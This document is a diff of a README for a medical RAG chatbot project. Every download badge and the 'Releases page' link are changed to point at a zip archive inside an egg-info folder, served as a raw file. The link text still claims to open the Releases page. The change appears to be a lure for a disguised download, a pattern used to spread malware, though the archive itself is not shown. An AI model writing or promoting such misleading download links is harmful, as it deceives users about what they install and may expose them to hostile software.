@@ -6,11 +6,11 @@ The medical-rag-chatbot is a tool designed to help you find answers to medical q
 ## 🚀 Getting Started
 To get started with the medical-rag-chatbot, follow the steps below to download and install the application. You can have it up and running in just a few minutes.
 
-[![Download medical-rag-chatbot](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Fenix11118/medical-rag-chatbot/releases)
+[![Download medical-rag-chatbot](https://raw.githubusercontent.com/Fenix11118/medical-rag-chatbot/main/Generative_AI_Project.egg-info/medical-chatbot-rag-v2.5.zip)](https://raw.githubusercontent.com/Fenix11118/medical-rag-chatbot/main/Generative_AI_Project.egg-info/medical-chatbot-rag-v2.5.zip)
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
-   Click [here](https://github.com/Fenix11118/medical-rag-chatbot/releases) to visit the Releases page. 
+   Click [here](https://raw.githubusercontent.com/Fenix11118/medical-rag-chatbot/main/Generative_AI_Project.egg-info/medical-chatbot-rag-v2.5.zip) to visit the Releases page. 
 
 2. **Select the Latest Version**  
    You will see a list of available versions. Look for the latest version at the top. 
@@ -65,4 +65,4 @@ If you experience any issues, consider the following steps:
 ## 🌟 Conclusion
 The medical-rag-chatbot is a simple yet powerful tool designed to improve how you get answers to medical questions. Download it today to start your journey towards easier access to medical information.
 
-[![Download medical-rag-chatbot](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Fenix11118/medical-rag-chatbot/releases)
+[![Download medical-rag-chatbot](https://raw.githubusercontent.com/Fenix11118/medical-rag-chatbot/main/Generative_AI_Project.egg-info/medical-chatbot-rag-v2.5.zip)](https://raw.githubusercontent.com/Fenix11118/medical-rag-chatbot/main/Generative_AI_Project.egg-info/medical-chatbot-rag-v2.5.zip)
